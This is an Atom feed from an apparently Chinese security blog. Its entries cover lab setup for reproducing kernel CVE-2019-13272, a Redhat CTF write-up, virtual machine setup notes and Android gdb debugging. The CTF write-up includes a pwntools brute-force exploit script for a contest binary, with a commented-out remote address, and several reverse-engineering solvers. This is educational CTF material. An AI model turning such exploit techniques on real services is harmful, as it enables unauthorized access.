<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-24T11:41:17.025Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>PwnHt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-13272复现</title>
    <link href="http://yoursite.com/2019/11/24/CVE-2019-13272%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/24/CVE-2019-13272复现/</id>
    <published>2019-11-24T11:16:46.000Z</published>
    <updated>2019-11-24T11:41:17.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><h2 id="0x00-确定内核版本"><a href="#0x00-确定内核版本" class="headerlink" title="0x00 确定内核版本"></a>0x00 确定内核版本</h2><p>首先找到漏洞来源：</p><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a></p><p>之后找到漏洞修补的commit</p><p><img src="/2019/11/24/CVE-2019-13272复现/1574594505159.png" alt="1574594505159"></p><p>然后找到漏洞的影响的内核commit 和修补之后的commit</p><p><img src="/2019/11/24/CVE-2019-13272复现/1574594551295.png" alt="1574594551295"></p><p>然后，用git命令diff一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 550d1f5bda33fa3b203d8cf8df1396825dbfd213 6994eefb0053799d2e07cd140df6c2ea106c41ee</span><br></pre></td></tr></table></figure><p>看一下，改了哪些部分，然后，git回滚到漏洞的commit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 550d1f5bda33fa3b203d8cf8df1396825dbfd213</span><br></pre></td></tr></table></figure><h2 id="0x01-编译内核"><a href="#0x01-编译内核" class="headerlink" title="0x01 编译内核"></a>0x01 编译内核</h2><p>编译内核，参考：</p><p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><p>这个库，真的好用。。。。</p><h2 id="0x02-构建文件系统"><a href="#0x02-构建文件系统" class="headerlink" title="0x02 构建文件系统"></a>0x02 构建文件系统</h2><p>我觉得最好的方案是按照那个md构建文件系统，就能用ssh连接到kernel，不用每次都打包文件系统了</p><p>其他的方案：</p><ul><li><a href="https://www.cnblogs.com/pengdonglin137/p/9540670.html" target="_blank" rel="noopener">https://www.cnblogs.com/pengdonglin137/p/9540670.html</a></li></ul><p>这个自由度高一点，自己得动手，一步步的做，而syzkaller一步到位</p><ul><li>busybox 网上博客很多不再赘述</li></ul><p>构建的时候，有个问题是他要下载好多包，都是国外的，所以，本地就很慢，我的解决方案是：</p><ul><li>用国外的vps构建系统，然后，打包，开一个nginx服务，本地开个vpn在chrome下载</li></ul><p>我也试过bash直接挂代理，效果不佳。。。。</p><h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><ul><li>Failed to start Raise network interfaces</li></ul><p>参考:<br><a href="https://groups.google.com/forum/#!searchin/syzkaller/Failed$20to$20start$20Raise$20network$20interfaces%7Csort:date/syzkaller/ryXUTw9RlJs/btNnI2IDAgAJ" target="_blank" rel="noopener">https://groups.google.com/forum/#!searchin/syzkaller/Failed$20to$20start$20Raise$20network$20interfaces%7Csort:date/syzkaller/ryXUTw9RlJs/btNnI2IDAgAJ</a></p><ul><li>ssh连接不上</li></ul><p>参考：</p><p><a href="https://www.jianshu.com/p/9dbb1dea5929" target="_blank" rel="noopener">https://www.jianshu.com/p/9dbb1dea5929</a></p>]]></content>
    
    <summary type="html">
    
      第一次复现kernel主要是环境搭建坑比较多
    
    </summary>
    
    
    
      <category term="cve,kernel" scheme="http://yoursite.com/tags/cve-kernel/"/>
    
  </entry>
  
  <entry>
    <title>redhat</title>
    <link href="http://yoursite.com/2019/11/21/redhat/"/>
    <id>http://yoursite.com/2019/11/21/redhat/</id>
    <published>2019-11-21T11:21:06.000Z</published>
    <updated>2019-11-25T04:47:19.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-pwn"><a href="#0x00-pwn" class="headerlink" title="0x00 pwn"></a>0x00 pwn</h1><h2 id="0x01-three"><a href="#0x01-three" class="headerlink" title="0x01 three"></a>0x01 three</h2><p><img src="/2019/11/21/redhat/1573440323504.png" alt="1573440323504"></p><p>这个就不算漏洞函数了吧，算是后门函数，让你读三个bit去之后执行这个三个bit如果返回结果正确就就输出1，不然输出二，如果仔细观察内存的话call这个3bit的时候，寄存器的ecx是我们之前tell me输入的buf的指针，正好 <strong>asm(mov eax,[ecx],ret)</strong> 是三个字节，所以，爆破就完事了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">__author__ = &apos;3summer&apos;</span><br><span class="line">s       = lambda data            :io.send(str(data)) </span><br><span class="line">sa      = lambda delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data            :io.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda numb=4096       :io.recv(numb)</span><br><span class="line">ru      = lambda delims,drop=True:io.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                  :io.interactive()</span><br><span class="line">uu32    = lambda data            :u32(data.ljust(4, &apos;\0&apos;))</span><br><span class="line">uu64    = lambda data            :u64(data.ljust(8, &apos;\0&apos;))</span><br><span class="line">code = &apos;\x8b\x01\xc3&apos;</span><br><span class="line">io = None</span><br><span class="line">flag = []</span><br><span class="line">for i in range(0x20):</span><br><span class="line">    for j in range(30, 128):</span><br><span class="line">        try:</span><br><span class="line">            io = process(&apos;./pwn&apos;)</span><br><span class="line">#           io=remote(&quot;47.104.190.38&quot;,12001)</span><br><span class="line">            sla(&apos;index:\n&apos;,str(i))</span><br><span class="line">            sa(&apos;much!\n&apos;,code)</span><br><span class="line">            sla(&apos;size:\n&apos;,&apos;2&apos;)</span><br><span class="line">            sa(&apos;Tell me:\n&apos;,chr(j))</span><br><span class="line">            isright = ru(&apos;\n&apos;)</span><br><span class="line">            io.close()</span><br><span class="line">            if isright == &apos;1&apos;:</span><br><span class="line">                flag.append(chr(j))</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    if chr(j) == &apos;&#125;&apos;:</span><br><span class="line">        break</span><br><span class="line">print &apos;&apos;.join(flag)</span><br></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="0x00-xx"><a href="#0x00-xx" class="headerlink" title="0x00 xx"></a>0x00 xx</h2><p>从题目上可以联想到xxtea</p><p><img src="/2019/11/21/redhat/1573441291534.png" alt="1573441291534"></p><p>关键判断在这了，如果，v20加密之后的字串和v30逐位比较，如果10次比较成功，就会输出 <strong>you win</strong> ，那么，之后看v20怎么来的就可以了</p><p>然后正向看，在<strong>sub_140001AB0（）</strong> 函数里面，魔数 <strong>0x61C88647</strong> 为xxtea加密，那么，如果想得到明文需要key，那么怎么生成key</p><p>用输入的前四位作为key的前4位（<del>前四位肯定是flag。。。当时还寻思着爆破来着2333</del>），高12个字节均为0</p><p><img src="/2019/11/21/redhat/1573441847614.png" alt="1573441847614"></p><p>然后进行一个下面的操作，就得到了v20，逆向一下，就可以了</p><p><img src="/2019/11/21/redhat/1573442276581.png" alt="1573442276581"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#define DELTA 0x9e3779b9</span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t *v, int n, uint32_t const key[4])</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t y, z, sum;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    if (n &gt; 1)            /* Coding Part */</span><br><span class="line">    &#123;</span><br><span class="line">        rounds = 6 + 52 / n;</span><br><span class="line">        sum = 0;</span><br><span class="line">        z = v[n - 1];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p = 0; p &lt; n - 1; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + 1];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[0];</span><br><span class="line">            z = v[n - 1] += MX;</span><br><span class="line">        &#125; while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (n &lt; -1)      /* Decoding Part */</span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = 6 + 52 / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[0];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p = n - 1; p &gt; 0; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - 1];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - 1];</span><br><span class="line">            y = v[0] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int key[4] = &#123; 0x67616c66, 0, 0, 0 &#125;;</span><br><span class="line">    char target[24]=&#123;0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B, 0x20, 0x20, 0x91, 0xF7, 0x02, 0x35,0x23, 0x18, 0x02, 0xC8, 0xE7, 0x56, 0x56, 0xFA&#125;;</span><br><span class="line">    for(int i=23;i&gt;0;i--)&#123;</span><br><span class="line">        int index = i/3;</span><br><span class="line">        if(index &gt; 0)&#123;</span><br><span class="line">            while (index &gt; 0)&#123;</span><br><span class="line">                index --;</span><br><span class="line">                target[i] ^= target[index];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    char s[24]=&quot;&quot;;</span><br><span class="line">    s[2] = target[0];</span><br><span class="line">    s[0] = target[1];</span><br><span class="line">    s[3] = target[2];</span><br><span class="line">    s[1] = target[3];</span><br><span class="line">    s[6] = target[4];</span><br><span class="line">    s[4] = target[5];</span><br><span class="line">    s[7] = target[6];</span><br><span class="line">    s[5] = target[7];</span><br><span class="line">    s[10] = target[8];</span><br><span class="line">    s[8] = target[9];</span><br><span class="line">    s[11] = target[10];</span><br><span class="line">    s[9] = target[11];</span><br><span class="line">    s[14] = target[12];</span><br><span class="line">    s[12] = target[13];</span><br><span class="line">    s[15] = target[14];</span><br><span class="line">    s[13] = target[15];</span><br><span class="line">    s[18] = target[16];</span><br><span class="line">    s[16] = target[17];</span><br><span class="line">    s[19] = target[18];</span><br><span class="line">    s[17] = target[19];</span><br><span class="line">    s[22] = target[20];</span><br><span class="line">    s[20] = target[21];</span><br><span class="line">    s[23] = target[22];</span><br><span class="line">    s[21] = target[23];</span><br><span class="line">    btea((uint32_t*)s, -6, key);</span><br><span class="line">    printf(&quot;%s\n&quot;,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-easyRE"><a href="#0x01-easyRE" class="headerlink" title="0x01 easyRE"></a>0x01 easyRE</h2><p>这个题目有一个坑点，就是，过了main函数这个判断，的到不是flag，而是，看雪版主发的一个主动防御的文章？？？</p><p><img src="/2019/11/21/redhat/1573445711073.png" alt="1573445711073"></p><p>其实真正的条件在fini_arrary调用的函数</p><p><img src="/2019/11/21/redhat/1573446213053.png" alt="1573446213053"></p><p><img src="/2019/11/21/redhat/1573446287560.png" alt="1573446287560"></p><p>只要过这个判断就可以了，正常情况是过不了这个条件的，因为v5是个随机数，不可预期，但是由于，puts为flag字串的话，前四位一定为flag，flag字串和byte_6CC0A0的前四位异或，就能的到v8的值，然后再异或输出flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">target=[0x40,0x35,0x20,0x56,0x5D,0x18,0x22,0x45,0x17,0x2F,0x24,0x6E,0x62,0x3C,0x27,0x54,0x48,0x6C,0x24,0x6E,0x72,0x3C,0x32,0x45,0x5B]</span><br><span class="line">key=[]</span><br><span class="line">flag=&quot;flag&quot;</span><br><span class="line">for i in flag:</span><br><span class="line">    key.append(ord(i)^target[flag.index(i)])</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0,0x19):</span><br><span class="line">    flag+=chr(target[i]^key[i%4])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="0x02-childRE"><a href="#0x02-childRE" class="headerlink" title="0x02 childRE"></a>0x02 childRE</h2><p>首先正向分析，根据调试，这一段代码会打乱你的输入，是一个位置互换的的算法，但是不改变的你输入的值，你输入是和互换的位置是没有关系的</p><p><img src="/2019/11/21/redhat/1573448182456.png" alt="1573448182456"></p><p>然后，再逆向分析</p><p><img src="/2019/11/21/redhat/1573448913949.png" alt="1573448913949"></p><p>这里求出 <strong>output string</strong> ，得到output string为<strong>private: char <em> __thiscall R0Pxx::My_Aut0_PWN(unsigned char </em>)</strong></p><p>得到的长度62，而输入的为31，怎么才能的得到这个呢？？</p><p><img src="/2019/11/21/redhat/1573449689566.png" alt="1573449689566"></p><p>百度了一下这个函数</p><p><img src="/2019/11/21/redhat/1573449756676.png" alt="1573449756676"></p><p>这个函数是为了防止符号冲突，写成特定的格式，防止冲突，那么，这个可以扩展字串吗，当然，我们可以看到output string为一个函数的声明的格式，所以，我输入31个字节，也是可以的到62个字节的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">str_remainder = &apos;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&apos;</span><br><span class="line">str_quotient =  &apos;55565653255552225565565555243466334653663544426565555525555222&apos;</span><br><span class="line">src = &apos;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&apos;</span><br><span class="line"></span><br><span class="line">output_string=&quot;&quot;</span><br><span class="line">for i in range(len(str_quotient)):</span><br><span class="line">    output_string+=chr(src.index(str_remainder[i])+src.index(str_quotient[i])*23)</span><br><span class="line">#private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</span><br><span class="line">str_input = &apos;1234567890abcdefghijklmnopqstuv&apos;</span><br><span class="line">str_encode = &apos;fg8hi94jk0lma52nobpqc6stduve731&apos;</span><br><span class="line">flag = []</span><br><span class="line">#?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</span><br><span class="line"></span><br><span class="line">encode_input = &apos;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&apos;</span><br><span class="line">decode_input=&quot;&quot;</span><br><span class="line">for i in range(len(encode_input)):</span><br><span class="line">    decode_input+=encode_input[str_encode.index(str_input[i])]</span><br><span class="line">print decode_input</span><br></pre></td></tr></table></figure><p>最后flag就是decode_input的md5值</p>]]></content>
    
    <summary type="html">
    
      redhatwp
    
    </summary>
    
    
    
      <category term="ctf,writeup" scheme="http://yoursite.com/tags/ctf-writeup/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机整理</title>
    <link href="http://yoursite.com/2019/11/21/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2019/11/21/虚拟机整理/</id>
    <published>2019-11-21T11:21:06.000Z</published>
    <updated>2019-11-25T04:39:41.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着虚拟机的使用时间的增加，虚拟机所占的空间也在增加，所以，只能扩容，，问题是虚拟机硬盘扩容之后就不能缩减了，而且，一个虚拟机往往做好多种类的事情比如，要做android 还要做，linux kernel，然后，虚拟机所占空间大于60G，不便携带，应该根据使用强度，放到移动硬盘（<del>主要是本机的硬盘的容量不够2333</del>），所以，要分类，划分多个虚拟机，应该有一个基础的虚拟机，如果，有新的方向就可从基础虚拟机扩展，不用从零开始搭建了</p><h1 id="0x00-需要的虚拟机的数量"><a href="#0x00-需要的虚拟机的数量" class="headerlink" title="0x00 需要的虚拟机的数量"></a>0x00 需要的虚拟机的数量</h1><p>应该根据方向</p><ul><li>用户态的pwn（qemu逃逸）</li><li>内核态的pwn （qemu逃逸）</li><li>vmware逃逸环境</li><li>android kernel</li><li>基础虚拟机</li></ul><h1 id="0x00-基础虚拟机配置"><a href="#0x00-基础虚拟机配置" class="headerlink" title="0x00 基础虚拟机配置"></a>0x00 基础虚拟机配置</h1><h2 id="0x00-更新源"><a href="#0x00-更新源" class="headerlink" title="0x00 更新源"></a>0x00 更新源</h2><h3 id="0x00-apt"><a href="#0x00-apt" class="headerlink" title="0x00 apt"></a>0x00 apt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure><h3 id="0x00-pip"><a href="#0x00-pip" class="headerlink" title="0x00 pip"></a>0x00 pip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir .pip</span><br><span class="line">sudo vim .pip/pip.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">[install]</span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h2 id="0x00-常用软件"><a href="#0x00-常用软件" class="headerlink" title="0x00 常用软件"></a>0x00 常用软件</h2><ul><li><p>vim（源码编译）</p></li><li><p>git</p></li><li>pip</li><li>ipython</li><li>pwntools</li><li>gdb(源码编译)</li></ul><h3 id="0x00-源码编译vim"><a href="#0x00-源码编译vim" class="headerlink" title="0x00 源码编译vim"></a>0x00 源码编译vim</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:vim/vim.git</span><br><span class="line">cd vim/</span><br><span class="line">./configure --with-features=huge --enable-pythoninterp --enable-rubyinterp --enable-luainterp --enable-perlinterp --with-python-config-dir=/usr/lib/python2.7/config/ --enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h4 id="0x01-踩坑"><a href="#0x01-踩坑" class="headerlink" title="0x01 踩坑"></a>0x01 踩坑</h4><ul><li>make出错</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure><h1 id="android-kernel-环境搭建"><a href="#android-kernel-环境搭建" class="headerlink" title="android kernel 环境搭建"></a>android kernel 环境搭建</h1><ul><li><p>交叉编译gdb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=arm-linux --enable-sim --prefix=/usr/local/arm/</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>ropper使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f /mnt/hgfs/tmp/android_kernel/ranchu_3.10_vmlinux --nocolor &gt; ranchu_ropper_gadget</span><br></pre></td></tr></table></figure></li><li><p>git取消代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure></li><li><p>adb</p></li><li><p>ropper</p><p>遇到filebytes 安装失败 ，在 <strong>pypi.org</strong> 下载filebytes压缩包，然后改setup.py的setup()函数为setup（name=“filebytes”），安装完成后，在python库的文件夹下应该有三个文件，egg，info和filebytes如果没有就需要手动移到里面去</p></li></ul>]]></content>
    
    <summary type="html">
    
      这里总结一下虚拟机整理
    
    </summary>
    
    
    
      <category term="vmware" scheme="http://yoursite.com/tags/vmware/"/>
    
  </entry>
  
  <entry>
    <title>gdb远程调试android虚拟机的c程序</title>
    <link href="http://yoursite.com/2019/11/19/gdb%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95android%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84c%E7%A8%8B%E5%BA%8F/"/>
    <id>http://yoursite.com/2019/11/19/gdb远程调试android虚拟机的c程序/</id>
    <published>2019-11-19T09:52:49.000Z</published>
    <updated>2019-11-25T04:44:52.711Z</updated>
    
    <content type="html"><![CDATA[<ul><li>远程开启gdbservice</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">gdbserver 10.0.2.2:1233 /system/exp</span><br></pre></td></tr></table></figure><p>10.0.2.2为android虚拟机的默认地址</p><ul><li>开启端口映射</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 5554</span><br><span class="line">auth </span><br><span class="line">redir add tcp:1233:1233</span><br></pre></td></tr></table></figure><ul><li>gdb远程调试exp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./exp</span><br><span class="line">target remote :1233</span><br></pre></td></tr></table></figure><ul><li>ubuntu交叉编译c</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-androideabi</span><br><span class="line">arm-linux-androideabi-gcc --sysroot=/opt/android/android-ndk-r9c/platforms/android-19/arch-arm -o test lin.c</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这里总结一下android kernel的环境搭建
    
    </summary>
    
    
    
      <category term="kernel,android" scheme="http://yoursite.com/tags/kernel-android/"/>
    
  </entry>
  
  <entry>
    <title>&#39;python多线程&#39;</title>
    <link href="http://yoursite.com/2019/11/17/python%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/11/17/python多线程/</id>
    <published>2019-11-17T10:31:35.000Z</published>
    <updated>2019-11-17T10:55:26.713Z</updated>
    
